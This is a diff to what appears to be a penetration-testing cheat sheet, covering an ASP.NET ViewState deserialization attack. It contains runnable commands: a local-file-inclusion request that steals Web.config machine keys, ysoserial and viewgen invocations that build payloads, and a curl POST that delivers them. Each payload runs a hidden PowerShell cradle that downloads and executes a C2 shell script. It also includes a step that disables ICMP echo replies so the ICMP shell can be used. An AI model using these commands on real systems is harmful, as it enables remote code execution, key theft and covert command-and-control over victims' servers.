@@ -239,17 +239,18 @@
 
 	ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
 
-	# initial access
+	# lfi for web.config with machine keys, viewgen to generate payload
+	proxychains wget http://<FQDN>:<PORT>/Home/DownloadFile?file=`%2FWeb.config -O web.confg
+	viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
+	
+	# initial access via viewstate payload
 	proxychains curl -sv 'http://<URL>/Content/default.aspx' \  
 	  -H 'Connection: keep-alive' \
 	  -H 'Content-Type: application/x-www-form-urlencoded' \
 	  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
 	  -H 'Accept: */*' \
 	  -H 'Accept-Language: en-US,en;q=0.9' \
-	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
-	  
-	# with compromised web.configs from internal boxes (alternative)
-	proxychains viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
+	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1	  	
 	
 	# connect to compromised target via icmp, http, or just tcp...
 	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
